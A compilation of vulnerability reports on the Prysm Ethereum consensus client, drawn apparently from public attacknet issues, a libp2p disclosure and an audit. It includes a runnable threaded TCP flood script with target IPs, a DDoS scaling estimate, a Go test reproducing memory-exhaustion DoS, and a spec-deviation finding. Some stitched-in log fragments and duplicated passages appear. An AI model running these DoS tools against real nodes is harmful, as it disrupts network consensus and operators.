 #1  https://github.com/ethereum/public-attacknets/issues/1

 The success of this attack was due to a 9 year old bug in the Go standard library. During the "post-mortem" @protolambda, @prestonvanloon, @raulk and I uncovered this bug and opted to responsibly disclose the details to the golang security team. See the link below for more details:

https://groups.google.com/forum/#!msg/golang-announce/NyPIaucMgXo/GdsyQP6QAAAJ

As a part of the responsible disclosure process, I opted to delete this issue until the vulnerability could be fixed and a security patch released. The following is the original description of the attack (unaltered). Enjoy!

Description
Prysm nodes are vulnerable to a DoS attack that prevents them from participating in consensus.

Attack scenario
Three out of four Prsym nodes were targeted by 2 AWS t2.small machines with a sustained DoS attack.

Impact
The effect that the DoS attack had on the attacknet was a prolonged loss finality; however, the network was able to recover to a healthy state within a few epochs once the attack stopped. The nodes under attack demonstrated high CPU usage, a large amount of outbound traffic, trouble finding peers in subnets and one node's local clock had a time disparity causing issues importing blocks.

Details
Attack Procedure
This is the code that the two machines ran to prevent finality on the attacknet

```rust
#!/usr/bin/python3
import threading
import socket
import time
import sys

def worker(id,ip,port):
    while True:
      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      sock.connect((ip,port))
      print("Worker {} connected".format(id))
      packet = bytes([255]*65536)
      sock.send(packet)
      time.sleep(20)
      sock.close()

if __name__ == "__main__":
    ip=sys.argv[1]
    port=int(sys.argv[2])
    num_threads=int(sys.argv[3])

    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=worker, args=(i,ip,port))
        threads.append(thread)
        thread.start()
```
To execute the attack, I targeted the following IP addresses with three processes - two processes on one machine and one process on the other.

18.183.12.240
3.127.134.103
34.237.53.47
Each process spawned 500 threads that enter an infinite loop that perform the following steps:

connect to Prysm node
sends a ~65KB payload
Note: the attack definitely works with payloads xFF, xFE, ... , but x00 causes Prysm to disconnect

sleep for 20 seconds.
Note: the amount of time to sleep acts as a ratelimiter and is somewhat arbitrary, but experimentally it was lower than the Prysm node's timeout I noticed when using netcat.

When developing this attack, the first thing I attempted to do was use the same command that crashed Teku. Unfortunately, sending output from /dev/zero caused Prysm to immediately disconnect.

 
 #2 [prysm-attack-0 Reward] L4 Distributed Denial of Service attack ruins the P2P connectivity and stops finality
https://github.com/ethereum/public-attacknets/issues/9

 Description
Prysm nodes are vulnerable to L4 DDoS attacks. The attacker can stop finality for any amount of time.

Attack scenario
There are 4 nodes on this network, and I've rented 4x10 DigitalOcean droplets and started the L4 DoS utility on each of them. It was enough to break the whole network P2P connectivity.

Impact
The nodes were unable to normally communicate with each other. As a result, new nodes were unable to sync, and validators submit their attestations.

Details
Attack period: 2109-2125 epochs

Attack requirements
Simple L4 DoS utility (code)
Script to rent and orchestrate servers.
Attack log
[2020-07-29 12:39:02] ERROR sync: Unable to retrieve block from stream error=i/o deadline reached
[2020-07-29 12:39:02] ERROR sync: Unable to retrieve block from stream error=i/o deadline reached
[2020-07-29 12:39:02] ERROR sync: Could not send recent block request: i/o deadline reached
[2020-07-29 12:39:02]  INFO sync: Requesting parent block currentSlot=67660 parentRoot=17fa5b2bb063
[2020-07-29 12:39:12] ERROR sync: Unable to retrieve block from stream error=i/o deadline reached
[2020-07-29 12:39:13]  INFO sync: Requesting parent block currentSlot=67681 parentRoot=87e4fe87c0c6
[2020-07-29 12:39:17] ERROR sync: Could not process block from slot 67489: could not process block: could not execute state transition: could not process slot: expected state.slot 67496 < slot 67489
[2020-07-29 12:39:17]  INFO sync: Requesting parent block currentSlot=67490 parentRoot=70f8a3e2f405

How to mitigate?
Prysm nodes should temporarily ban IPs that flood their P2P port with the garbage traffic.
How severe it is?
Let's assume that the eth2 network has 5000 validating nodes out there, and the average internet speed worldwide is 11 mbps.

Attack scenario:
To be sure that the node would be DDoS'ed - we will dedicate 22 mbps (2x speed) to each one.

Note that in real world speed would be adjusted for every node by determining the ISP's average speed (is it a home ISP, hosting, business, etc).

# 3
Starting gRPC with missing SSL credentials should fail
https://github.com/OffchainLabs/prysm/issues/7577

https://github.com/prysmaticlabs/prysm/blob/9db6c0042b02d48d593f2121e82df1c666672b1a/beacon-chain/rpc/service.go#L219-L226

Prysm currently marks the node as unhealthy, but will continue to serve an unsecured gRPC server.
This should be changed to a fatal condition on startup.



# 4
libp2p identify DoS

Disclosure to Protocol Labs & Libp2p core. DoS vector found by @protolambda.

The problem: streaming a "delta" in identification info: malefactor can push without rate-limit, and protocols get accumulated into in-memory peerstore. Libp2p delta implementation

The libp2p identify information is put into the peerstore by default, which is a memory peerstore by default. The Prysm Eth2 client has been updated to disable the delta-protocol until it is safe to use again.

The delta identify stream processes 2048 bytes at a time, but is not rate limited, and all protocols are added to the existing peerstore records. Without expiration of protocols, pruning, validity checks, or sanity checks of any kind.

The result is that an attacker can feed a Go Libp2p node until the node goes OOM. The most efficient approach found so far creates a 10x amplification in bandwidth vs. memory consumed.

Below is a test-case to reproduce an attack on a node efficiently, with log info about memory usage:

package identify

import (
	"github.com/fjl/memsize"
    //...
)

func TestService_identifyDoS(t *testing.T) {
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	sk1, _, err := coretest.RandTestKeyPair(ic.RSA, 4096)
	require.NoError(t, err)
	sk2, _, err := coretest.RandTestKeyPair(ic.RSA, 4096)
	require.NoError(t, err)

	hA := blhost.NewBlankHost(swarmt.GenSwarm(t, ctx, swarmt.OptPeerPrivateKey(sk1)))
	hB := blhost.NewBlankHost(swarmt.GenSwarm(t, ctx, swarmt.OptPeerPrivateKey(sk2)))

	// make sure to close them
	defer func() {
		if err := hA.Close(); err != nil {
			t.Fatal(err)
		}
		if err := hB.Close(); err != nil {
			t.Fatal(err)
		}
	}()

	hAid := hA.ID()
	hBid := hB.ID()

	ids1 := identify.NewIDService(hA)
	ids2 := identify.NewIDService(hB)
	defer ids1.Close()
	defer ids2.Close()

	testKnowsAddrs(t, hA, hBid, []ma.Multiaddr{}) // nothing
	testKnowsAddrs(t, hB, hAid, []ma.Multiaddr{}) // nothing

	h2pi := hB.Peerstore().PeerInfo(hBid)
	require.NoError(t, hA.Connect(ctx, h2pi))
	// hA should immediately see a connection from hB
	require.Len(t, hA.Network().ConnsToPeer(hBid), 1)
	// wait for hB to Identify itself so we are sure hB has seen the connection.
	ids1.IdentifyConn(hA.Network().ConnsToPeer(hBid)[0])

	// hB should now see the connection and we should wait for hA to Identify itself to hB.
	require.Len(t, hB.Network().ConnsToPeer(hAid), 1)
	ids2.IdentifyConn(hB.Network().ConnsToPeer(hAid)[0])

	testKnowsAddrs(t, hA, hBid, hB.Peerstore().Addrs(hBid))
	testKnowsAddrs(t, hB, hAid, hA.Peerstore().Addrs(hAid))

	// Pretend host A is a victim node

	// Now host B, the attacker, will send a lot of evil identify requests to the libp2p node, to fill its memory peerstore.

	// TODO: increase this to increase DoS force.
	msgCount := uint64(20000)

	t.Log("before attack, peerstore memory is:\n", memsize.Scan(hA.Peerstore()).Report())

	// Attacker can re-use the same buffer, and overwrite the message contents, to be very efficient with memory.
	// The opposite of the victim.

	// what really happens:
	// msg := &idpb.Identify{Delta: &idpb.Delta{AddedProtocols: make([]string, 0, 340)}}
	// for i := 0; i < 340; i++ {
	// 	msg.Delta.AddedProtocols = append(msg.Delta.AddedProtocols, string("abcd"))
	// }
	// res, _ := msg.Marshal()
	// t.Logf("%x", res)

	// limit (excl varint prefix) is 2048 bytes. Stay under that, then repeat with new stream.
	data := [2 + 3 + 2040]byte{
		// 0, 1: protobuf length prefix
		2: 0x3a, // the "Delta" field
		3: 0xf8, 0x0f, // the length varint
		// on repeat 340 times: 0x0a (the "AddedProtocols" field), 0x04 to encode length, then 4 bytes content
	}
	binary.PutUvarint(data[0:2], uint64(2043))
	for i := 2 + 3; i < len(data); i += 2 + 4 {
		data[i] = 0x0a
		data[i+1] = 0x04
	}
	// 2048 bytes per message limit, 3 starting data, 4 + 2 bytes per msg = 340 messages

	j := uint32(0)
	for i := uint64(0); i < msgCount; i++ {
		// start at contents of first protocol
		for x := 2 + 3 + 2; x < len(data); x += 2 + 4 {
			binary.LittleEndian.PutUint32(data[x:], j)
			j++
		}
		ds, err := hB.NewStream(ctx, hAid, identify.IDDelta)
		require.NoError(t, err)
		n, err := ds.Write(data[:])
		require.NoError(t, err)
		require.Equal(t, n, 2045)
		require.NoError(t, ds.Close())
	}

	// we need to wait until host A receives the malicious deltas of host B.
	time.Sleep(10 * time.Second)
	t.Log("after attack, peerstore memory is:\n", memsize.Scan(hA.Peerstore()).Report())
	protocols, err := hA.Peerstore().GetProtocols(hBid)
	require.NoError(t, err)
	t.Logf("host A knows %d protocols of host B", len(protocols))
	// protocolsPerMsg * msgCount, plus some default protocols (ping, identify, etc.)
	expected := 40 * msgCount
	if uint64(len(protocols)) < 3 {
		t.Fatalf("expected %d protocols to be registered", expected)
	}
	t.Logf("est. encoded bandwidth (ignore encryption, mplex overhead) cost is: %d bytes", uint64(len(data))*msgCount)
}
Output:

=== RUN   TestService_identifyDoS
    id_test.go:1041: before attack, peerstore memory is:
         ALL                           548  32.311 KB
        pstoremem.addrSegment         256  10.289 KB
        pstoremem.protoSegment        256   8.154 KB
        big.Int                         9   4.344 KB
        crypto.RsaPublicKey             4   2.355 KB
        pstoremem.memoryProtoBook       1   2.227 KB
        pstoremem.memoryAddrBook        1   2.031 KB
        record.Envelope                 2   1.395 KB
        pstoremem.memoryPeerMetadata    1      470 B
        pstoremem.memoryKeyBook         1      238 B
        peer.PeerRecord                 2      196 B
        multiaddr.multiaddr             4      128 B
        crypto.RsaPrivateKey            1      112 B
        time.Location                   1      104 B
        pstoremem.expiringAddr          2       96 B
        context.cancelCtx               1       56 B
        pstoremem.pstoremem             1       48 B
        pstoremem.peerRecordState       2       32 B
        peerstore.metrics               1       32 B
        pstoremem.AddrSubManager        1       32 B
        context.emptyCtx                1        8 B
        
    id_test.go:1085: after attack, peerstore memory is:
         ALL                           548  389.134 MB
        pstoremem.memoryProtoBook       1  259.402 MB
        pstoremem.protoSegment        256  129.708 MB
        pstoremem.addrSegment         256   10.289 KB
        big.Int                         9    4.344 KB
        time.Location                   1    3.457 KB
        crypto.RsaPublicKey             4    2.355 KB
        pstoremem.memoryAddrBook        1    2.031 KB
        record.Envelope                 2    1.395 KB
        pstoremem.memoryPeerMetadata    1       470 B
        pstoremem.memoryKeyBook         1       238 B
        peer.PeerRecord                 2       196 B
        multiaddr.multiaddr             4       128 B
        crypto.RsaPrivateKey            1       112 B
        pstoremem.expiringAddr          2        96 B
        context.cancelCtx               1        56 B
        pstoremem.pstoremem             1        48 B
        pstoremem.AddrSubManager        1        32 B
        pstoremem.peerRecordState       2        32 B
        peerstore.metrics               1        32 B
        context.emptyCtx                1         8 B
        
    id_test.go:1088: host A knows 6800003 protocols of host B
    id_test.go:1094: est. encoded bandwidth (ignore encryption, mplex overhead) cost is: 40900000 bytes
Note that at the cost of ~40.1 MB, the peerstore increased almost 390 MB. This scales linearly, and can be parallized with multiple peers targetting the victim.





[2020-07-29 12:39:22] ERROR sync: Unable to retrieve block from stream error=i/o deadline reached
[2020-07-29 12:39:27] ERROR sync: Unable to retrieve block from stream error=i/o deadline reached
[2020-07-29 12:39:27] ERROR sync: Could not send recent block request: i/o deadline reached.



# 4

Summary: Due to an optimization in Prysm, this implementation does not follow the specifications when
two pending deposits with the same previously unknown validator occur in the same slot. This client will
ignore the second pending deposit if it has an invalid signature while it should process it. The other clients
comply with the specs.
Specifications & Context: The beacon-chain specs show the new process_pending_deposits function
for EIP-6110 and EIP-7152. This function follow the following specifications.
Specifications & Context: The beacon-chain specs show the new process_pending_deposits function
for EIP-6110 and EIP-7152. This function follow the following specifications.
def process_pending_deposits(state: BeaconState) -> None:
next_epoch = Epoch(get_current_epoch(state) + 1)
available_for_processing = state.deposit_balance_to_consume + get_activation_exit_churn_limit(state)
processed_amount = 0
next_deposit_index = 0
deposits_to_postpone = []
is_churn_limit_reached = False
finalized_slot = compute_start_slot_at_epoch(state.finalized_checkpoint.epoch)
for deposit in state.pending_deposits:
# Do not process deposit requests if Eth1 bridge deposits are not yet applied.
if (
# Is deposit request
deposit.slot > GENESIS_SLOT and
# There are pending Eth1 bridge deposits
state.eth1_deposit_index < state.deposit_requests_start_index
):
break
# Check if deposit has been finalized, otherwise, stop processing.
if deposit.slot > finalized_slot:
break
# Check if number of processed deposits has not reached the limit, otherwise, stop processing.
if next_deposit_index >= MAX_PENDING_DEPOSITS_PER_EPOCH:
break
# Read validator state
is_validator_exited = False
is_validator_withdrawn = False
validator_pubkeys = [v.pubkey for v in state.validators]
if deposit.pubkey in validator_pubkeys:
validator = state.validators[ValidatorIndex(validator_pubkeys.index(deposit.pubkey))]
is_validator_exited = validator.exit_epoch < FAR_FUTURE_EPOCH
is_validator_withdrawn = validator.withdrawable_epoch < next_epoch
if is_validator_withdrawn:
# Deposited balance will never become active. Increase balance but do not consume churn
apply_pending_deposit(state, deposit)
elif is_validator_exited:
# Validator is exiting, postpone the deposit until after withdrawable epoch
deposits_to_postpone.append(deposit)
else:
# Check if deposit fits in the churn, otherwise, do no more deposit processing in this epoch.
is_churn_limit_reached = processed_amount + deposit.amount > available_for_processing
if is_churn_limit_reached:
break
# Consume churn and apply deposit.
processed_amount += deposit.amount
apply_pending_deposit(state, deposit)
# Regardless of how the deposit was handled, we move on in the queue.
4
next_deposit_index += 1
state.pending_deposits = state.pending_deposits[next_deposit_index:] + deposits_to_postpone
# Accumulate churn only if the churn limit has been hit.
if is_churn_limit_reached:
state.deposit_balance_to_consume = available_for_processing - processed_amount
else:
state.deposit_balance_to_consume = Gwei(0)
This function calls apply_pending_deposit when the validator is not marked as withdrawn or exited. Then,
apply_pending_deposit is defined as the following.
def apply_pending_deposit(state: BeaconState, deposit: PendingDeposit) -> None:
"""
Applies ``deposit`` to the ``state``.
"""
validator_pubkeys = [v.pubkey for v in state.validators]
if deposit.pubkey not in validator_pubkeys:
# Verify the deposit signature (proof of possession) which is not checked by the deposit contract
if is_valid_deposit_signature(
deposit.pubkey,
deposit.withdrawal_credentials,
deposit.amount,
deposit.signature
):
add_validator_to_registry(state, deposit.pubkey, deposit.withdrawal_credentials, deposit.amount)
else:
validator_index = ValidatorIndex(validator_pubkeys.index(deposit.pubkey))
increase_balance(state, validator_index, deposit.amount)
We note that in apply_pending_deposit, the signature is verified if and only if the validator public key is
not known. In this case, the public key is added to the registry through add_validator_to_registry.
Finally, add_validator_to_registry adds the validator to the state.validators.
def add_validator_to_registry(state: BeaconState,
pubkey: BLSPubkey,
withdrawal_credentials: Bytes32,
amount: uint64) -> None:
index = get_index_for_new_validator(state)
validator = get_validator_from_deposit(pubkey, withdrawal_credentials, amount) # [Modified in
,→ Electra:EIP7251]
set_or_append_list(state.validators, index, validator)
# ...
Important: This means that when a validator makes two subsequent deposits that are processed in the
same slot, only the signature of the first deposit must be verified.

Important: This means that when a validator makes two subsequent deposits that are processed in the
same slot, only the signature of the first deposit must be verified.
Description: According to specifications, the pending deposits are supposed to be processed subsequently. In case a pending deposit with a new validator is found, apply_pending_deposit will verify the
signature and add it to the registry. Any subsequent pending deposit with the same validator will be
processed as validator is already known and will not verify the signature.
Due to an optimization in the process_pending_deposits implementation, Prysm derives from the specifications. When two deposits for the same validator previously unknown are processed in the same slot,
Prysm will verify the signature of both deposits. Other clients will verify the signature of the first deposits
only.
Impact: Any registering validator can slash Prysm validators through malicious transaction by sending
two deposit transactions in the same block. As Prysm does not comply with the specifications, all validators using it will misbehave. This raises the splited percentage of validators to ~32% according to clientdiversity.org. Combined with Besu vulnerability with v-parity on EIP-7702 transactions, the total splited
percentage of validators will reach the 33% limit, making this a High vulnerability issue.
